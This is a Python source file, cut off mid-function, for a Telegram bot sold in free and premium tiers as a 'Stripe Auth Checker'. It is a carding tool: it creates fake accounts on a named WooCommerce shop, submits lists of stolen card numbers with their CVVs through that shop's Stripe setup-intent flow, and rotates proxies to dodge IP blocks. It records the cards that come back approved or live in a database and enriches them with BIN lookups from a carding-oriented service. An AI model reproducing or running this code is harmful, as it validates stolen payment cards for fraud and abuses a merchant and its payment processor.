import telebot
import base64, re, time, os, sys, json, threading, hashlib, requests, random, datetime, queue, uuid, sqlite3
from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent
from concurrent.futures import ThreadPoolExecutor
from faker import Faker

if sys.platform == 'win32':
    os.system('chcp 65001 > nul')
try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

faker = Faker()

# ---------- ENVIRONMENT CONFIG ----------
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_ID = int(os.getenv("ADMIN_ID", "123456789"))
DB_PATH = os.getenv("DB_PATH", "Data/bot.db")
PROXY_UPLOAD_PATH = "Data/proxy_upload.txt"

os.makedirs('Data', exist_ok=True)

bot = telebot.TeleBot(BOT_TOKEN)

# ---------- CONSTANTS ----------
FREE_LIMIT = 0
PREMIUM_LIMIT = 1000
MAX_RETRIES = 3
MAX_PROXY_FAILURES = 2
BIN_CACHE_TTL = 3600
GATEWAY = [
    {
        "name": "Dila Boards",
        "url": "https://dilaboards.com/en/moj-racun/add-payment-method/",
        "ajax_url": "https://dilaboards.com/en/",
    }
]

# ---------- GLOBAL STATE LOCKS ----------
state_lock = threading.Lock()
ACTIVE_JOBS = {}
ACTIVE_USERS_PP = {}
ACTIVE_USERS_MPP = {}
USER_ACTIVE_JOB = {}

# ---------- PROXY MANAGER ----------
class ProxyManager:
    def __init__(self):
        self.lock = threading.Lock()
        self.proxies = []   # list of [dict, raw_str, fail_count]
        self.index = 0

    def load_from_list(self, proxy_lines):
        new_list = []
        for line in proxy_lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            fmt = self._format_proxy(line)
            if fmt:
                proxy_dict = self._proxy_str_to_dict(fmt)
                if proxy_dict:
                    new_list.append([proxy_dict, fmt, 0])
        with self.lock:
            self.proxies = new_list
            self.index = 0

    def _format_proxy(self, proxy_str):
        proxy_str = proxy_str.strip()
        if '@' in proxy_str:
            return proxy_str
        parts = proxy_str.split(':')
        if len(parts) == 4:  # ip:port:user:pass
            return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return proxy_str

    def _proxy_str_to_dict(self, formatted_str):
        if formatted_str.startswith('socks5h://'):
            return {"http": formatted_str, "https": formatted_str}
        elif formatted_str.startswith('http://'):
            return {"http": formatted_str, "https": formatted_str}
        else:
            return {"http": f"http://{formatted_str}", "https": f"http://{formatted_str}"}

    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None, None
            entry = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return entry[0], entry[1]

    def report_failure(self, raw_proxy_str):
        with self.lock:
            for entry in self.proxies:
                if entry[1] == raw_proxy_str:
                    entry[2] += 1
                    if entry[2] >= MAX_PROXY_FAILURES:
                        self.proxies.remove(entry)
                        print(f"[!] Removed dead proxy: {entry[1]}")
                    break

    def report_success(self, raw_proxy_str):
        with self.lock:
            for entry in self.proxies:
                if entry[1] == raw_proxy_str:
                    entry[2] = 0
                    break

    def count(self):
        with self.lock:
            return len(self.proxies)

proxy_manager = ProxyManager()

# ---------- BIN CACHE ----------
BIN_CACHE = {}   # {bin: (info_tuple, timestamp)}

def get_bin_info(bin_code):
    now = time.time()
    if bin_code in BIN_CACHE:
        entry, ts = BIN_CACHE[bin_code]
        if now - ts < BIN_CACHE_TTL:
            return entry
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=5)
        if res.status_code == 200:
            data = res.json()
            brand = data.get('brand', 'UNKNOWN')
            bank = data.get('bank', 'UNKNOWN')
            country = data.get('country_name', 'UNKNOWN')
            level = data.get('level', 'N/A')
            type_cc = data.get('type', 'N/A')
            flag = data.get('country_flag', '')
            entry = (brand, bank, country, level, type_cc, flag)
            BIN_CACHE[bin_code] = (entry, now)
            return entry
    except:
        pass
    return ("UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A", "")

# ---------- DATABASE SETUP ----------
def init_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        joined_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS premium (
        user_id INTEGER PRIMARY KEY,
        expires REAL
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS banned (
        user_id INTEGER PRIMARY KEY,
        expires REAL
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS stats (
        key TEXT PRIMARY KEY,
        value INTEGER
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS hits (
        cc TEXT,
        status TEXT,
        response TEXT,
        timestamp REAL
    )''')
    # default stats
    for key in ['approved','live','3ds']:
        c.execute("INSERT OR IGNORE INTO stats (key,value) VALUES (?,0)", (key,))
    conn.commit()
    conn.close()

def get_db():
    return sqlite3.connect(DB_PATH, check_same_thread=False)

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_premium(user_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT expires FROM premium WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        exp = row[0]
        if exp == 0 or time.time() < exp:
            return True
    return False

def is_banned(user_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT expires FROM banned WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        exp = row[0]
        if exp == 0 or time.time() < exp:
            return True
    return False

def add_user(user_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, joined_at) VALUES (?, datetime('now'))", (user_id,))
    conn.commit()
    conn.close()

def update_stats(status):
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE stats SET value = value + 1 WHERE key=?", (status,))
    conn.commit()
    conn.close()

def save_hit(cc, status, response):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO hits (cc, status, response, timestamp) VALUES (?,?,?,?)",
              (cc, status, str(response), time.time()))
    conn.commit()
    conn.close()

def get_stats_dict():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT key, value FROM stats")
    rows = c.fetchall()
    conn.close()
    return {row[0]: row[1] for row in rows}

def get_total_users():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    row = c.fetchone()
    conn.close()
    return row[0] if row else 0

# ---------- HELPER FUNCTIONS ----------
def fmt(text):
    return str(text)

def extract_message(response):
    try:
        response_json = response.json()
        if 'message' in response_json: return response_json['message']
        if 'data' in response_json:
            data = response_json['data']
            if isinstance(data, dict):
                if 'message' in data: return data['message']
                if 'error' in data and isinstance(data['error'], dict):
                    return data['error'].get('message', str(data['error']))
        if 'error' in response_json:
            err = response_json['error']
            if isinstance(err, dict): return err.get('message', str(err))
            return str(err)
        for value in response_json.values():
            if isinstance(value, dict) and 'message' in value: return value['message']
        return f"Message not found. Status: {response.status_code}"
    except:
        if "so soon" in response.text.lower() or "too many" in response.text.lower():
            return "Rate Limit"
        match = re.search(r'"message":"(.*?)"', response.text)
        if match: return match.group(1)
        return "Unknown error"

# ---------- CORE CHECK FUNCTION ----------
def check_cc(cc_full, proxy=None, proxy_raw=None):
    session = requests.Session()
    if proxy:
        session.proxies = proxy

    try:
        data_parts = cc_full.strip().split('|')
        cc, mm, yy, cvv = data_parts[0], data_parts[1], data_parts[2], data_parts[3].replace('.', '')
    except:
        return "ERROR", "Invalid format", "UNKNOWN"

    last_err = "Gateway Rate Limited"

    def check_block(r):
        if r and "access to this site has been limited" in r.text.lower():
            return True
        return False

    for gw in GATEWAY:
        try:
            user_ag = generate_user_agent()
            current_cookies = {}
            current_nonce = ""
            current_pk = ""
            ajax_url = gw["ajax_url"]

            # --- Registration Phase (unchanged) ---
            if "dilaboards.com" in gw.get("url", ""):
                url_1 = gw["url"]
                h_pre = {
                    'User-Agent': user_ag,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Alt-Used': 'dilaboards.com',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Priority': 'u=0, i',
                }
                r_pre = session.get(url_1, headers=h_pre, timeout=15)
                if check_block(r_pre):
                    if proxy_raw: proxy_manager.report_failure(proxy_raw)
                    return "ERROR", "IP BLOCKED", "UNKNOWN"
                nonces = re.findall('name="woocommerce-register-nonce" value="(.*?)"', r_pre.text)
                if not nonces:
                    last_err = "Registration Failed"
                    continue
                reg_nonce = nonces[0]
                pks = re.findall('"key":"(.*?)"', r_pre.text)
                if not pks:
                    last_err = "Registration Failed"
                    continue
                current_pk = pks[0]

                h_reg = {
                    'User-Agent': user_ag,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://dilaboards.com',
                    'Alt-Used': 'dilaboards.com',
                    'Connection': 'keep-alive',
                    'Referer': url_1,
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Priority': 'u=0, i',
                }
                reg_data = {
                    'email': faker.email(domain="gmail.com"),
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': url_1,
                    'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'wc_order_attribution_session_pages': '2',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': user_ag,
                    'woocommerce-register-nonce': reg_nonce,
                    '_wp_http_referer': '/en/moj-racun/add-payment-method/',
                    'register': 'Register',
                }
                r_reg = session.post(url_1, headers=h_reg, data=reg_data, timeout=15)
                if check_block(r_reg):
                    if proxy_raw: proxy_manager.report_failure(proxy_raw)
                    return "ERROR", "IP BLOCKED", "UNKNOWN"
                if "so soon" in r_reg.text.lower() or "too many" in r_reg.text.lower():
                    last_err = "Registration Rate Limited"
                    continue
                n2 = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', r_reg.text)
                if not n2:
                    last_err = "Registration Failed"
                    continue
                current_nonce = n2[0]
                current_cookies = session.cookies.get_dict()

            # --- Stripe Payment Method ---
            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())
            ele_id = f"src_{random.getrandbits(128):032x}"
            h1 = {
                'User-Agent': user_ag,
                'Accept': 'application/json',
                'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
            }
            d1 = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'allow_redisplay': 'unspecified',
                'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
                'billing_details[address][country]': 'US',
                'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
                'referrer': gw.get("url", "https://dilaboards.com"),
                'time_on_page': str(random.randint(10000, 99999)),
                'client_attribution_metadata[client_session_id]': ele_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': ele_id,
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': current_pk,
                '_stripe_version': '2024-06-20',
            }
            r1 = session.post('https://api.stripe.com/v1/payment_methods', headers=h1, data=d1, timeout=15)
            res1 = r1.json()
            if "error" in res1:
                msg = res1["error"].get("message", "Declined")
                brand = res1.get("card", {}).get("brand", "UNKNOWN")
                if "security code is" in msg.lower():
                    return "LIVE", msg, brand
                last_err = msg
                continue
            pm_id = res1["id"]
            brand = res1.get("card", {}).get("brand", "UNKNOWN")

            # --- Confirm Setup Intent ---
            h2 = {
                'User-Agent': user_ag,
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': gw.get("url", ajax_url),
            }
            if current_cookies:
                session.cookies.update(current_cookies)
            d2 = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': current_nonce,
            }
            final_ajax_url = f"{ajax_url}?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            r2 = session.post(final_ajax_url, headers=h2, data=d2, timeout=20)
            if check_block(r2):
                if proxy_raw: proxy_manager.report_failure(proxy_raw)
                return "ERROR", "IP BLOCKED", "UNKNOWN"
            if r2.status_code == 429:
                continue
            res2 = r2.json()
            success = res2.get('success', False)
            status_val = res2.get('data', {}).get('status', 'unknown')
            if success or status_val == 'succeeded':
                return "APPROVED", "Payment method added successfully.", brand
            msg = extract_message(r2)
            if "so soon" in msg.lower() or "too many" in msg.lower():
                last_err = "Gateway Rate Limited"
                continue
            if "security code is" in msg.lower():
                return "LIVE", msg, brand
            if "authenticate" in msg.lower() or "challenge" in msg.lower() or "3d" in msg.lower() or "requires_action" in msg.lower() or "require_action" in msg.lower():
                return "3DS", "3DS", brand
            return "DECLINED", msg, brand

        except requests.exceptions.ProxyError:
            if proxy_raw: proxy_manager.report_failure(proxy_raw)
            return "ERROR", "Proxy dead", "UNKNOWN"
        except requests.exceptions.ConnectTimeout:
            if proxy_raw: proxy_manager.report_failure(proxy_raw)
            return "ERROR", "Proxy timeout", "UNKNOWN"
        except Exception as e:
            last_err = "Gateway Rate Limited"
            continue

    return "ERROR", "Gateway Rate Limited", "UNKNOWN"

# ---------- TELEGRAM COMMAND HANDLERS ----------
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
        return
    add_user(user_id)
    fname = message.from_user.first_name

    if is_admin(user_id):
        role = " [ADMIN]"
        menu = f"""𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗖𝗵𝗲𝗰𝗸𝗲𝗿.

𝗨𝘀𝗲𝗿 𝗖𝗺𝗱𝘀:
/st <cc|mm|yy|cvv> - Single Check
/mst (reply to file) - Mass Check
/stop - Stop Mass Job
/info - User Info

𝗔𝗱𝗺𝗶𝗻 𝗖𝗺𝗱𝘀:
/addpremium <userid> <duration>
/rmpremium <userid>
/ban <userid> <duration>
/unban <userid>
/stats
/uploadproxy (reply to .txt) - Load Proxies

𝗗𝗲𝘃 ↬ @Xoarch"""
    elif is_premium(user_id):
        role = " [PREMIUM]"
        menu = f"""𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗖𝗵𝗲𝗰𝗸𝗲𝗿.

𝗖𝗺𝗱𝘀:
/st <cc|mm|yy|cvv> - Single Check
/mst (reply to file) - Mass Check
/stop - Stop Mass Job
/info - My Info

𝗗𝗲𝘃 ↬ @Xoarch"""
    else:
        role = " [FREE]"
        if FREE_LIMIT == 0:
            menu = f"""𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗖𝗵𝗲𝗰𝗸𝗲𝗿.

𝗖𝗺𝗱𝘀:
/st <cc|mm|yy|cvv> - Single Check
/mst - Mass Check (𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗢𝗻𝗹𝘆)
/stop - Stop Mass Job
/info - My Info

𝗗𝗲𝘃 ↬ @Xoarch"""
        else:
            menu = f"""𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗖𝗵𝗲𝗰𝗸𝗲𝗿.

𝗖𝗺𝗱𝘀:
/st <cc|mm|yy|cvv> - Single Check
/mst (reply to file) - Mass Check
/stop - Stop Mass Job
/info - My Info

𝗗𝗲𝘃 ↬ @Xoarch"""
    bot.reply_to(message, menu)

# Upload proxy command
@bot.message_handler(commands=['uploadproxy'])
def upload_proxy_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆!")
        return
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "[✗] 𝗥𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 (𝗶𝗽:𝗽𝗼𝗿𝘁:𝘂𝘀𝗲𝗿:𝗽𝗮𝘀𝘀 𝗼𝗿 𝘂𝘀𝗲𝗿:𝗽𝗮𝘀𝘀@𝗶𝗽:𝗽𝗼𝗿𝘁)")
        return
    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    lines = downloaded.decode('utf-8').splitlines()
    proxy_manager.load_from_list(lines)
    count = proxy_manager.count()
    bot.reply_to(message, f"[✓] 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗟𝗼𝗮𝗱𝗲𝗱: {count}")

# Single Check
@bot.message_handler(commands=['st'])
def single_check(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
        return
    add_user(user_id)

    if ACTIVE_USERS_PP.get(user_id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮 𝘀𝗶𝗻𝗴𝗹𝗲 𝗰𝗵𝗲𝗰𝗸 𝗿𝘂𝗻𝗻𝗶𝗻𝗴! 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁.")
        return

    cc = None
    if len(message.text.split()) > 1:
        cc = message.text.split()[1].split('#')[0].strip()
    elif message.reply_to_message:
        target_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        match = re.search(r'(\d{15,16})[|](\d{2})[|](\d{2,4})[|](\d{3,4})', target_text)
        if match:
            cc = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"

    if not cc:
        usage_msg = "[✗] 𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /𝙨𝙩 4111...|12|25|123\n\n[✗] 𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝗖𝗖 𝙞𝙣𝙛𝙤"
        bot.reply_to(message, usage_msg)
        return

    ACTIVE_USERS_PP[user_id] = True
    msg = bot.reply_to(message, "[↻] 𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭...")

    bin_code = cc[:6]
    brand_bin, bank, country, level, type_cc, flag = get_bin_info(bin_code)

    status = "ERROR"
    response = "Unknown error"
    brand_auto = "UNKNOWN"
    for _ in range(MAX_RETRIES):
        proxy_dict, proxy_raw = proxy_manager.get_proxy()
        try:
            status, response, brand_auto = check_cc(cc, proxy_dict, proxy_raw)
            if status != "ERROR":
                if proxy_raw: proxy_manager.report_success(proxy_raw)
                break
            else:
                if proxy_raw: proxy_manager.report_failure(proxy_raw)
        except:
            if proxy_raw: proxy_manager.report_failure(proxy_raw)
            continue

    response = fmt(response)
    brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
    safe_response = str(response).replace("<", "").replace(">", "").replace("&", "")

    if status == "APPROVED":
        status_font = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
        update_stats('approved')
        save_hit(cc, 'approved', safe_response)
    elif status == "LIVE":
        status_font = "𝐋𝐢𝐯𝐞 ☑"
        update_stats('live')
        save_hit(cc, 'live', safe_response)
    elif status == "3DS":
        status_font = "𝟑𝐃𝐒 ❎"
        update_stats('3ds')
        save_hit(cc, '3ds', safe_response)
    elif status == "DECLINED":
        status_font = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
    else:
        status_font = "𝐄𝐫𝐫𝐨𝐫"

    if is_admin(user_id): is_p = " [ADMIN]"
    elif is_premium(user_id): is_p = " [PREMIUM]"
    else: is_p = " [FREE]"

    safe_fname = str(message.from_user.first_name).replace("<", "").replace(">", "").replace("&", "")
    safe_bank = str(bank).replace("<", "").replace(">", "").replace("&", "")
    safe_brand = str(brand).replace("<", "").replace(">", "").replace("&", "")

    res = f"""
𝐂𝐚𝐫𝐝 ↬ <code>{cc}</code>
𝐒𝐭𝐚𝐭𝐮𝐬 ↬ {status_font}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↬ <code>{safe_response}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡
━━━━━━━━━━━
𝐈𝐧𝐟𝐨 ↬ {safe_brand} - {type_cc} - {level}
𝐁𝐚𝐧𝐤 ↬ {safe_bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↬ {country} {flag}
━━━━━━━━━━━
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ↬ {safe_fname}{is_p}
𝐃𝐞𝐯 ↬ @Xoarch
"""
    try: bot.delete_message(message.chat.id, msg.message_id)
    except: pass

    try: bot.reply_to(message, res, parse_mode="HTML")
    except:
        try: bot.reply_to(message, res.replace("<code>", "").replace("</code>", ""))
        except: pass

    ACTIVE_USERS_PP[user_id] = False

# Mass Check (unchanged logic but with proxy rotation and DB saving)
@bot.message_handler(commands=['mst'])
def mass_check(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
        return
    add_user(user_id)

    if ACTIVE_USERS_MPP.get(user_id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮 𝗺𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸 𝗿𝘂𝗻𝗻𝗶𝗻𝗴! 𝗣𝗹𝗲𝗮𝘀𝗲 /𝘀𝘁𝗼𝗽 𝗶𝘁 𝗳𝗶𝗿𝘀𝘁.")
        return

    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "[✗] 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 /mst")
        return

    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    ccs = downloaded_file.decode('utf-8').splitlines()
    ccs = list(dict.fromkeys([l.split('#')[0].strip() for l in ccs if l.strip()]))

    is_p = is_premium(user_id)
    limit = PREMIUM_LIMIT if is_p or is_admin(user_id) else FREE_LIMIT

    if limit == 0:
        was_premium = False
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT 1 FROM premium WHERE user_id=?", (user_id,))
        if c.fetchone():
            was_premium = True
        conn.close()
        if was_premium:
            bot.reply_to(message, "𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄.")
        else:
            bot.reply_to(message, "[✗] 𝗙𝗿𝗲𝗲 𝘂𝘀𝗲𝗿𝘀 𝗰𝗮𝗻𝗻𝗼𝘁 𝘂𝘀𝗲 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸! 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝗽𝗴𝗿𝗮𝗱𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺.")
        return

    total_found = len(ccs)
    if total_found > limit:
        bot.reply_to(message, f"[!] 𝙁𝙤𝙪𝙣𝙙 {total_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚\n𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝗴 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝘁 {limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)\n{limit} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙")
        ccs = ccs[:limit]

    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
    ACTIVE_JOBS[job_id] = True
    ACTIVE_USERS_MPP[user_id] = True
    USER_ACTIVE_JOB[user_id] = job_id
    total = len(ccs)
    if is_admin(user_id): is_p = " [ADMIN]"
    elif is_premium(user_id): is_p = " [PREMIUM]"
    else: is_p = " [FREE]"

    initial_text = f"𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗝𝗼𝗯: {job_id} / 𝗦𝘁𝗿𝗶𝗽𝗲 — 𝗥𝘂𝗻𝗻𝗶𝗻𝗴\n\n[□□□□□□□□□□] (0.0%)\n\n𝗧𝗮𝘀𝗸       ↬ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n𝗧𝗼𝘁𝗮𝗹      ↬ {total}\n𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱  ↬ 0/{total}\n𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱   ↬ 0\n𝗟𝗶𝘃𝗲       ↬ 0\n𝟑𝐃𝐒        ↬ 0\n𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱   ↬ 0\n𝗘𝗿𝗿𝗼𝗿𝘀     ↬ 0\n𝗧/𝗧        ↬ 0𝘀\n𝗨𝘀𝗲𝗿       ↬ {message.from_user.first_name}{is_p}\n\n𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗥𝘂𝗻𝗻𝗶𝗻𝗴.\n\n𝗗𝗲𝘃 ↬ @Xoarch"
    prog_msg = bot.reply_to(message, initial_text)

    results = {"APPROVED": 0, "LIVE": 0, "3DS": 0, "DECLINED": 0, "ERROR": 0}
    lock = threading.Lock()
    start_time = time.time()

    def worker(cc):
        if not ACTIVE_JOBS.get(job_id):
            return
        status = "ERROR"
        response = "Unknown"
        brand_auto = "UNKNOWN"
        for _ in range(MAX_RETRIES):
            proxy_dict, proxy_raw = proxy_manager.get_proxy()
            try:
                status, response, brand_auto = check_cc(cc, proxy_dict, proxy_raw)
                if status != "ERROR":
                    if proxy_raw: proxy_manager.report_success(proxy_raw)
                    break
                else:
                    if proxy_raw: proxy_manager.report_failure(proxy_raw)
            except:
                if proxy_raw: proxy_manager.report_failure(proxy_raw)
                continue

        response = fmt(response)
        with lock:
            results[status] += 1
            checked = sum(results.values())

        if status in ("APPROVED", "LIVE", "3DS"):
            update_stats(status.lower() if status != "3DS" else "3ds")
            save_hit(cc, status.lower(), response)
            bin_code = cc[:6]
            brand_bin, bank, country, level, type_cc, flag = get_bin_info(bin_code)
            brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()

            if is_admin(user_id): is_p_user = " [ADMIN]"
            elif is_premium(user_id): is_p_user = " [PREMIUM]"
            else: is_p_user = " [FREE]"

